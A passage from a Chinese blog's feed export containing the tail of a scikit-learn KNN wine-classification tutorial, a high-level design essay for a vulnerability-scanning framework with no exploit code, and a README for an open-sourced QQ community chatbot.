shape:&#123;&#125;'</span>.format(y_train.shape))</span><br><span class="line">print(<span class="string">'y_test shape:&#123;&#125;'</span>.format(y_test.shape))</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/05c5977fc1669d54ba4e89dab533ea25" alt=""></p><p>可以看出在样本总数量178个中训练集以及对应的标签有133个约占（74.7%），测试集以及标签共有45个，约占（25.3%），特征数量为13个。</p><h3 id="建模"><a href="#建模" class="headerlink" title="建模"></a>建模</h3><p>使用scikit-learn的K最近邻算法进行分类，然后基于训练数据集进行训练建模，在训练数据集中进行寻找和新输入的数据最近的数据点，然后将这个数据点的标签分配给新的数据点，以此对新的样本进行分类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>导入KNN分类模型，然后将<code>n_neighbors</code>参数值设置为1，<code>n_neighbors</code>为K最近邻算法中的近邻数据。</p><p>然后通过<code>knn</code>来进行“拟合（<code>fit</code>）”的方法来进行建模，建模的依据就是训练集中样本数据<code>X_train</code>以及对应的<code>y_train</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(win_dataset[<span class="string">'data'</span>], win_dataset[<span class="string">'target'</span>], random_state=<span class="number">0</span>)</span><br><span class="line">knn.fit(X_train,y_train)</span><br><span class="line">print(knn)</span><br></pre></td></tr></table></figure><h3 id="新样本分类预测"><a href="#新样本分类预测" class="headerlink" title="新样本分类预测"></a>新样本分类预测</h3><h4 id="测试集样本分类"><a href="#测试集样本分类" class="headerlink" title="测试集样本分类"></a>测试集样本分类</h4><p>将训练好的模型用于进行训练测试集样本的准确率，来针对模型进行打分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(win_dataset[<span class="string">'data'</span>], win_dataset[<span class="string">'target'</span>], random_state=<span class="number">0</span>)</span><br><span class="line">knn.fit(X_train,y_train)</span><br><span class="line">print(knn)</span><br><span class="line">print(<span class="string">'测试集样本预测'</span>, knn.score(X_test, y_test))</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/a76be89034096ac9866dc6bbcbe2e6df" alt=""></p><p>可以看到模型针对测试集样本的预测正确的概率为75.5%。</p><h4 id="新样本预测"><a href="#新样本预测" class="headerlink" title="新样本预测"></a>新样本预测</h4><p>假设目前有一瓶新的红酒以及对应的特征进行使用模型预测：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X_new = np.array([[<span class="number">13.2</span>, <span class="number">2.77</span>, <span class="number">2.51</span>, <span class="number">18.5</span>, <span class="number">96.6</span>, <span class="number">1.04</span>, <span class="number">2.55</span>, <span class="number">0.57</span>, <span class="number">1.47</span>, <span class="number">6.2</span>, <span class="number">1.05</span>, <span class="number">3.33</span>, <span class="number">820</span>]])</span><br><span class="line">production = knn.predict(X_new)</span><br><span class="line">print(<span class="string">'预测红酒的类别为'</span>, win_dataset[<span class="string">'target_names'</span>][production])</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/4076a7cf384e88614ffb3369fa2adcb6" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> K最近邻算法 </tag>
            
            <tag> 近邻算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一款漏洞验证框架的构思</title>
      <link href="/posts/403bc5b/"/>
      <url>/posts/403bc5b/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章主要讲解一款漏洞验证框架的构思，并未详解内部的实现细节，本文篇幅稍长，请耐心看。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>做一款漏洞扫描器，首先要了解该扫描需要达到的效果。它的需求什么？需要支持什么？</p><p>可能需求如下：</p><ul><li>跨平台运行，可以在Windows、Mac OS、Linux等操作系统运行或者使用 WEB 端控制</li><li>自定义POC、EXP多语言支持，POC支持多种开发语言实现，例如支持 Java、python 等。</li><li>多种运行方式，支持多线程、多进程、分布式运行等多种方式</li><li>可视化，漏洞扫描框架通过可视化操作</li><li>资产管理，通过探测结果的资产进行POC验证以及EXP利用</li><li>。。。。。。</li></ul><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>上面简单明确了一些一款漏洞扫描器的需求，需求的实现最好根据需求选取适合的技术来进行实现。</p><h3 id="跨平台运行"><a href="#跨平台运行" class="headerlink" title="跨平台运行"></a>跨平台运行</h3><p>跨平台的开发语言有很多，例如C、C++、Java、Python、Go 等等。</p><p>开发语言的选择，需要根据框架需要满足的运行效率、开发效率等多种角度来进行考虑。</p><p>如果需要很高的运行效率以及开发效率高的情况下，可以选择使用 Java 或 Python 等语言，如果需要追求极高的效率可以使用 Go 语言。</p><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>Java 程序实际是在 Java 虚拟机( JRE 是软件实现)中运行，Java 虚拟机类似一个模拟执行环境，在不同的操作系统上拥有不同的 Java 虚拟机实现，但是这些 Java 虚拟机遵循统一的规范来解释 class 文件，并将 class 文件中的指令转换为本地操作系统对应的指令，这样就实现了相同的 class 文件，可以通过 Java 虚拟机转换为对应操作系统上的对应指令，实现 class 文件，也就是 Java 程序的跨平台性。</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>Python 是一门跨平台的脚本语言，Python 规定了一个 Python 语法规则，实现了 Python 语法的解释程序就成为了 Python 的解释器。</p><h3 id="自定义-POC"><a href="#自定义-POC" class="headerlink" title="自定义 POC"></a>自定义 POC</h3><p>自定义POC、EXP本质就是基于模版进行编写的POC，能够让扫描框架识别并且运行。模版的组成一般分为漏洞基本信息、POC验证信息、Exp利用信息。</p><h3 id="多种运行方式"><a href="#多种运行方式" class="headerlink" title="多种运行方式"></a>多种运行方式</h3><p>多种运行方式，支持多进程、多线程、分布式运行等方式。如果扫描器需要大规模的的扫描、探测建议使用分布式节点的方式进行操作。一般情况下，多线程、多进程可以满足大部分的需求。</p><p>一般分布式适用于大型的企业内网或大范围的扫描探测。</p><h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h3><p>可视化技术的选型，目前有三种比较流行的方案。</p><p>第一种为使用语言自带的可视化编程模块（QT）进行开发可视化程序。</p><p>第二种为使用 <a href="https://electronjs.org/" target="_blank" rel="noopener">Electron</a>  或 <a href="https://nwjs.io/" target="_blank" rel="noopener">nw.js </a> 进行开发可视化应用，其中比较有名的<a href="https://fofa.so/about_client" target="_blank" rel="noopener">FOFA Pro 客户端</a>、<a href="http://gobies.org/" target="_blank" rel="noopener">GoBy</a> 、<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">中国蚁剑</a>等就是基于此方案进行开发的， <a href="https://electronjs.org/" target="_blank" rel="noopener">Electron</a> 的官网有很多基于此框架开发的程序。</p><p>第三种为采用 B/S 架构进行开发，后端控制使用 WEB进行控制，节点使用 Python、Java 等语言进行开发，其中 BugScan、w8scan、<a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">巡风</a>等都是基于B/S架构实现。</p><h4 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h4><blockquote><p>Electron 是由 Github 开发，用 HTML，CSS 和 JavaScript 来构建跨平台桌面应用程序的一个开源库。 Electron 通过将 Chromium 和 Node.js 合并到同一个运行时环境中，并将其打包为Mac，Windows 和 Linux 系统下的应用来实现这一目的。</p><p>Electron 于 2013 年作为构建 Github 上可编程的文本编辑器 Atom 的框架而被开发出来。这两个项目在 2014 春季开源。</p><p>目前它已成为开源开发者、初创企业和老牌公司常用的开发工具。</p></blockquote><h4 id="nw-js"><a href="#nw-js" class="headerlink" title="nw.js"></a>nw.js</h4><blockquote><p>  nw.js 基于 Chromium 和 Node.js。NW.js 利用 Web 技术结合 Node.js 及其模块进行桌面应用开发。</p></blockquote><h3 id="资产管理"><a href="#资产管理" class="headerlink" title="资产管理"></a>资产管理</h3><p>资产管理，用于管理扫描探测结果的资产信息，用于资产与对应 POC 关联使用。其中资产管理中主要含有资产识别规则，用于识别资产的信息。例如通过资产的标题、body、证书、header、banner进行制定规则用于识别。</p><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-32-53.png" alt=""></p><p>整体框架分为并发引擎、插件中心、目标中心、漏洞验证四大模块。</p><ul><li>并发引擎：主要提供漏洞验证框架运行方式，例如多线程、多进程、分布式等运行方式。</li><li>插件中心：主要提供漏洞 POC 的模版、POC 的加载以及 POC 的管理。</li><li>目标中心：目标加载、管理目标资产、漏洞管理。</li><li>日志管理：管理框架中所有网络请求以及响应信息，提供后续的回溯。<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-06-19-11-06.png" alt=""><br>框架运行流程</li></ul><ol><li>选择合适的运行引擎，一般情况下使用多线程和多进程进行探测，如果探测大型企业内网以及大范围的扫描探测，分布式运行比较合适。</li><li>插件加载中心，进行加载使用的 POC。</li><li>目标加载，加载运行需要探测目标，可以导入单个ip、ip段以及文件形式进行加载。</li><li>探测分析，探测分析主要分为资产探测和漏洞探测，资产探测通过资产识别规则进行识别资产信息，漏洞探测根据识别的资产信息进行漏洞探测分析。</li></ol><h3 id="并发引擎"><a href="#并发引擎" class="headerlink" title="并发引擎"></a>并发引擎</h3><p>并发引擎主要为漏洞验证程序运行时选择的运行方式，主要有多线程、多进程、分布式 3 种运行方式，使用多线程、多进程、分布式运行方式来保证漏洞验证程序的效率。</p><p>正常情况下使用多线程、多进程适用于大部分使用的场景。</p><p>分布式运行用于大型企业内网探测或大规模的网络探测。</p><h3 id="插件中心"><a href="#插件中心" class="headerlink" title="插件中心"></a>插件中心</h3><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-07-14-20-16.png" alt=""></p><p>插件中心分为模版中心、插件加载中心以及插件管理中心组成。</p><p>模版中心提供 POC、Exp模版信息，主要分为通用模版和编程语言模版俩种。</p><p>插件中心，提供用户选择性需要测试的插件进行加载。</p><p>插件管理中心进行管理自定义编写的 POC。</p><h4 id="模版中心"><a href="#模版中心" class="headerlink" title="模版中心"></a>模版中心</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-19-18-50-10.png" alt=""></p><p>模版中心主要分为通用模版、编程语言模版，两大模块。其中各自组成都是由插件基本信息、POC 信息、Exp 信息三大部分组成。</p><p>插件基本信息由插件名称（漏洞名称）、类型、产品名称、等级、产品主页、描述等组成。</p><p>POC 信息由发包协议、发包方式、发包内容、逻辑判定等组成。</p><p>Exp 信息由POC 信息以及执行命令进行组成。</p><p>通常发包协议为 HTTP、HTTPS、TCP、UDP等，协议（部分）发包方式有 GET、POST、PUT、HEAD、DELETE、OPTIONS、TRACE、CONNECT等，逻辑判定由“与或非”。</p><h4 id="插件加载中心"><a href="#插件加载中心" class="headerlink" title="插件加载中心"></a>插件加载中心</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-19-19-18-12.png" alt=""></p><p>插件加载通过用户选用方式（全部加载、指定加载）进行加载插件。</p><ol><li>从插件数据库中获取需要加载的插件<strong>基本信息</strong>。</li><li>获取插件中的代码信息，根据信息从本地的 git 仓库中进行获取插件代码信息。</li><li>然后通过对应的加载服务进行加载 POC。</li></ol><h4 id="插件管理中心"><a href="#插件管理中心" class="headerlink" title="插件管理中心"></a>插件管理中心</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-15-04-23.png" alt=""></p><p>插件管理中心进行管理编写的插件信息，针对插件进行修改、删除、查询等操作。</p><ul><li>新增/修改：基于模版中心的通用模版和编程语言模版进行新增以及修改操作。</li><li>查询：通过模版中心中的字段作为依据进行多维度查询，获取插件信息提供后续的修改以及利用。</li><li>删除：通过模版中心中的字段作为依据进行多维度查询并且删除。</li></ul><h3 id="目标中心"><a href="#目标中心" class="headerlink" title="目标中心"></a>目标中心</h3><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-19-26.png" alt=""></p><p>目标中心主要负责分析目标加载、资产管理以及漏洞管理三大模块。</p><ul><li>目标加载模块：主要用来加载需要分析的目标。</li><li>资产管理：主要用来分析目标探测的资产信息、识别规则、漏洞信息管理。</li></ul><p>漏洞插件信息可以通过使用数据库配合 Git 来进行存储，数据库中进行存储插件的基本，Git 存放插件的具体代码信息，使用 Git 可以进行控制插件的版本，可进行回退等操作。</p><h4 id="目标加载"><a href="#目标加载" class="headerlink" title="目标加载"></a>目标加载</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-20-56-35.png" alt=""></p><p>目前加载可以通过加载单ip、ip段以及文件导入的方式进行导入。</p><ul><li>ip 段加载：进行生成 ip 段中的探测目标列表。</li><li>文件加载：解析导入的文件格式，通过对应的格式进行加载目标。</li></ul><h4 id="资产管理-1"><a href="#资产管理-1" class="headerlink" title="资产管理"></a>资产管理</h4><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-26-55.png" alt=""></p><p>资产管理模块主要进行管理分析目标识别成功的资产信息、漏洞管理、以及识别规则管理。</p><ul><li>目标资产：通过探测响应的信息与识别规则进行匹配进行识别资产，如果识别成功为已知资产，否则为未知资产，未知资产便于后续的规则录入提高资产的识别率。</li><li>漏洞管理：通过与已识别资产与对应的漏洞检测插件进行检测的结果。</li><li>识别规则：识别规则构造格式，可以通过探测响应的协议、响应内容、Header、服务类型等信息进行构造规则作为识别规则。</li></ul><h3 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h3><p><img src="http://img.zhiiyun.com/source/_posts/_image/2019-08-02/2019-08-22-21-45-33.png" alt=""></p><p>日志管理模块主要管理整体框架的日志信息包含日志记录、查询等操作。</p><ul><li>日志信息包含，框架内部请求信息（请求URI、请求方式（POST、GET、DELETE等）、请求参数等信息）以及响应信息（响应头、响应内容等信息）以及框架执行操作（资产探测、插件检测等）。</li><li>日志记录，可以通过统一请求中心记录网络日志信息。</li><li>日志查询，通过查询ip、请求URI、请求方式、响应内容等多维度进行查询，便于后续的漏洞漏洞排查。<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li></ul><p>文中的流程图：<a href="https://github.com/0nise/scripts/tree/master/%E4%B8%80%E6%AC%BE%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E6%A1%86%E6%9E%B6%E7%9A%84%E6%9E%84%E6%80%9D" target="_blank" rel="noopener">https://github.com/0nise/scripts</a></p><p>本文描述的为我所构思的一款漏洞探测框架，如果有文章内描述不符以及问题，请各位师傅不要吝啬，烦请各位师傅斧正。</p>]]></content>
      
      
      <categories>
          
          <category> 扫描器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扫描器 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋社区机器人开源</title>
      <link href="/posts/db85e47b/"/>
      <url>/posts/db85e47b/</url>
      
        <content type="html"><![CDATA[<h2 id="开源地址"><a href="#开源地址" class="headerlink" title="开源地址"></a>开源地址</h2><p><a href="https://github.com/0nise/ichunqiu_qqbot" target="_blank" rel="noopener">https://github.com/0nise/ichunqiu_qqbot</a></p><blockquote><p>i春秋社区机器人自<code>2018年02月04日</code>开始服务于i春秋社区，每日文章推送、文章查询、魔法币查询、作者信息查询、作家团奖金余额查询、奖金排行榜、i春秋课程查询等一列功能。据不完全统计，使用人数已经超过<code>3.5万</code>，使用次数达到<code>20万</code>，最大覆盖<code>700+</code>个群。</p></blockquote><blockquote><p>自<code>2019年6月13日</code>起i春秋社区机器人与i春秋社区相关的功能全部关闭，i春秋社区机器人宣布正式开源，非常感谢对i春秋社区机器人的支持。同时i春秋社区机器人正式更名为<code>Alpha机器人</code>，对于新的机器人正在构思中，有想法、建议的可以提交到<a href="https://github.com/0nise/ichunqiu_qqbot/issues" target="_blank" rel="noopener">Issues</a>中，非常感谢。</p></blockquote><ul><li><p>非常感谢期间的运维<a href="https://github.com/NS-Sp4ce" target="_blank" rel="noopener">NS-Sp4ce</a>。</p></li><li><p>非常感谢提出各种需求坏蛋。</p></li><li><p>非常感谢王八蛋<a href="https://github.com/newbe36524/" target="_blank" rel="noopener">newbe36524</a>的<a href="https://github.com/newbe36524/Newbe.Mahua.Framework" target="_blank" rel="noopener">Newbe.Mahua.Framework</a>框架的支持。</p></li><li><p>非常感谢<a href="https://github.com/CoolQ" target="_blank" rel="noopener">CoolQ</a>的支持。</p></li><li><p>非常感谢提交第一个漏洞的<a href="https://github.com/gh0stkey" target="_blank" rel="noopener">gh0stkey</a>。</p></li><li><p>……</p></li></ul><h2 id="功能指令"><a href="#功能指令" class="headerlink" title="功能指令"></a>功能指令</h2><h3 id="文章相关"><a href="#文章相关" class="headerlink" title="文章相关"></a>文章相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">随机文章 --&gt; 随机回复文章</span><br><span class="line">最新文章 --&gt; 回复最新文章</span><br><span class="line">作者随机 --&gt; 指定作者随机回复文章</span><br><span class="line">作者最新 --&gt; 回复作者最新文章</span><br></pre></td></tr></table></figure><h3 id="课程相关"><a href="#课程相关" class="headerlink" title="课程相关"></a>课程相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">随机教程 --&gt; i春秋首页随机课程</span><br><span class="line">最新教程 --&gt; i春秋首页最新课程</span><br><span class="line">今日最新 --&gt; i春秋首页课程1条和4条最新文章</span><br></pre></td></tr></table></figure><h3 id="群推送相关"><a href="#群推送相关" class="headerlink" title="群推送相关"></a>群推送相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发布 --&gt; 发布推送信息（管理员权限）</span><br><span class="line">艾特全体 --&gt; 发布推送信息（艾特全体推送）（管理员权限）</span><br></pre></td></tr></table></figure><h3 id="i春秋作家团相关"><a href="#i春秋作家团相关" class="headerlink" title="i春秋作家团相关"></a>i春秋作家团相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查询余额 --&gt; 查询i春秋作家团余额（自己）</span><br><span class="line">提现记录 --&gt; i春秋作家团成员提现记录</span><br><span class="line">财富榜 --&gt; i春秋作家团奖金排行</span><br><span class="line">我的信息 --&gt; i春秋作家团用户信息</span><br><span class="line">加钱 --&gt; i春秋作家团指定用户添加奖金（管理员权限）</span><br><span class="line">提现 --&gt; i春秋作家团发起体现</span><br></pre></td></tr></table></figure><h3 id="统计相关"><a href="#统计相关" class="headerlink" title="统计相关"></a>统计相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">今日使用 --&gt; 今日使用机器人次数（管理员权限）</span><br><span class="line">总人数 --&gt; 使用机器人次数（管理员权限）</span><br><span class="line">7日使用 --&gt; 一周内使用机器人情况（管理员权限）</span><br><span class="line">群数 --&gt; 机器人覆盖群数量（管理员权限）</span><br></pre></td></tr></table></figure><h3 id="帮助相关"><a href="#帮助相关" class="headerlink" title="帮助相关"></a>帮助相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">help --&gt; 指令信息</span><br><span class="line">指令 --&gt; 指令信息</span><br><span class="line">关于我 --&gt; 关于我</span><br></pre></td></tr></table></figure><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>操作系统：Windows 10</p><p>开发语言：CSharp</p><p>数据库：MySQL5.7</p><p>运行平台：<a href="https://cqp.cc/t/14901" target="_blank" rel="noopener">酷Q Pro</a></p><p>开发工具：Visual Studio 2019</p><p>.NET版本：4.5.2</p><p>开发框架：基于王八蛋<a href="https://github.com/newbe36524/" target="_blank" rel="noopener">newbe36524</a>的<a href="https://github.com/newbe36524/Newbe.Mahua.Framework" target="_blank" rel="noopener">Newbe.Mahua.Framework</a>框架开发</p><p>Newbe.Mahua.Framework：<a href="https://github.com/newbe36524/Newbe.Mahua.Framework" target="_blank" rel="noopener">https://github.com/newbe36524/Newbe.Mahua.Framework</a></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>运行<code>Newbe.Mahua.Plugins.iChunqiuQQBot/Newbe.Mahua.Plugins.iChunqiuQQBoot.Beta</code>目录中的<code>build.bat</code>文件进行编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build.bat</span><br></pre></td></tr></table></figure></p><h3 id="CoolQ运行"><a href="#CoolQ运行" class="headerlink" title="CoolQ运行"></a>CoolQ运行</h3><p>在<code>Newbe.Mahua.Plugins.iChunqiuQQBot/Newbe.Mahua.Plugins.iChunqiuQQBoot.Beta/bin</code>目录下会按照当前安装的平台生成相应的目录。本示例将会生成 CQP、Amanda 和 MPQ 三个目录。</p><p>分别将三个文件夹下的所有文件和文件夹都复制到对应的机器人平台根目录。</p><p>以 CQP 为例，进行一次复制过程如下图所示：</p><p><img src="https://img.zhiiyun.com/20180916-001.gif" alt="CQP复制插件"></p><p>各机器人软件下载地址：</p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">地址</th></tr></thead><tbody><tr><td style="text-align:center">CQP</td><td style="text-align:center"><a href="https://cqp.cc/" target="_blank" rel="noopener">https://cqp.cc/</a></td></tr><tr><td style="text-align:center">MPQ</td><td style="text-align:center"><a href="https://f.mypcqq.cc/thread-2327-1-1.html" target="_blank" rel="noopener">https://f.mypcqq.cc/thread-2327-1-1.html</a></td></tr><tr><td style="text-align:center">CleverQQ</td><td style="text-align:center"><a href="https://d.cleverqq.cn/forum.php" target="_blank" rel="noopener">https://d.cleverqq.cn/forum.php</a></td></tr><tr><td style="text-align:center">QQLight</td><td style="text-align:center"><a href="http://www.52chat.cc/" target="_blank" rel="noopener">http://www.52chat.cc/</a></td></tr></tbody></table><h3 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h3><p>各个机器人平台的启用方式各不相同。</p><h4 id="CQP"><a href="#CQP" class="headerlink" title="CQP"></a>CQP</h4><p>按照下图所示，开启开发者模式。</p><p><img src="https://img.zhiiyun.com/20171218-001.jpg" alt="开启开发者模式"></p><p>打开插件管理将插件启用。</p><h4 id="CleverQQ"><a href="#CleverQQ" class="headerlink" title="CleverQQ"></a>CleverQQ</h4><p>打开插件管理将插件启用。</p><h4 id="MPQ"><a href="#MPQ" class="headerlink" title="MPQ"></a>MPQ</h4><p>打开插件管理将插件启用。</p><h4 id="QQLight"><a href="#QQLight" class="headerlink" title="QQLight"></a>QQLight</h4><p>打开插件管理将插件启用。</p><h3 id="成功！"><a href="#成功！" class="headerlink" title="成功！"></a>成功！</h3><p>发送消息给机器人，你就会收到机器人回发的信息。</p><p><img src="https://img.zhiiyun.com/about_me.png" alt=""></p><blockquote><p>机器人插件启动可能需要一段时间，并且大多数平台都会丢弃离线信息，可能需要等待一会儿在发送。</p></blockquote><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p><a href="http://www.newbe.pro/2019/05/05/Newbe.Mahua/Newbe-Mahua-CQP-Hotfix/" target="_blank" rel="noopener">Newbe.Mahua CQP 紧急故障修复</a></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><h3 id="最新文章指令"><a href="#最新文章指令" class="headerlink" title="最新文章指令"></a>最新文章指令</h3><p><img src="https://img.zhiiyun.com/images.png" alt=""></p><h3 id="关于我指令"><a href="#关于我指令" class="headerlink" title="关于我指令"></a>关于我指令</h3><p><img src="https://img.zhiiyun.com/about_me.png" alt=""></p><h3 id="群数量指令"><a href="#群数量指令" class="headerlink" title="群数量指令"></a>群数量指令</h3><p><img src="https://img.zhiiyun.com/qum_count.png" alt=""></p><h2 id="文件简介"><a href="#文件简介" class="headerlink" title="文件简介"></a>文件简介</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├─images 图片资源</span><br><span class="line">├─Newbe.Mahua.Plugins.iChunqiuQQBot i春秋社区机器人源代码</span><br><span class="line">├─script i春秋爬虫脚本</span><br><span class="line">│  ├─spider_ichunqiu.py 爬虫i春秋全部社区文章</span><br><span class="line">│  ├─spider_ichunqiu_class.py 爬虫i春秋课程信息</span><br><span class="line">│  ├─spider_ichunqiu_ext.py 定时爬虫i春秋社区文章，只爬虫每个板块的第一页</span><br><span class="line">│  ├─ThreadPool.py 线程池</span><br><span class="line">│  └─update_content.py 定时更新数据数据库与论坛内容保持同步</span><br><span class="line">└─sql i春秋社区机器人数据库设计结构</span><br></pre></td></tr></table></figure><h2 id="程序更新日志"><a href="#程序更新日志" class="headerlink" title="程序更新日志"></a>程序更新日志</h2><p>2019.06.19</p><ul><li>i春秋社区机器人正式开源</li></ul><p>…… </p><ul><li>我也忘了我改了多少次了</li></ul><p>2018.5.21</p><ul><li>修改一些细微的BUG</li></ul><p>2018.3.13</p><ul><li>添加定时爬虫i春秋社区文章信息</li></ul><p>2018.3.9</p><ul><li>更新爬虫社区类别以及子类信息</li></ul><p>2018.3.1</p><ul><li>添加爬虫ｉ春秋课程的脚本</li></ul><p>2018.2.4</p><ul><li>修复机器人ＳＱＬ注入漏洞</li></ul><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://bbs.ichunqiu.com/thread-34956-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-34956-1-1.html</a></p><p><a href="https://bbs.ichunqiu.com/thread-33770-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-33770-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 机器人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
            <tag> 机器人 </tag>
            
            <tag> C sharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA Pro SpringBoot2 SDK</title>
      <link href="/posts/e0ad5c1b/"/>
      <url>/posts/e0ad5c1b/</url>
      
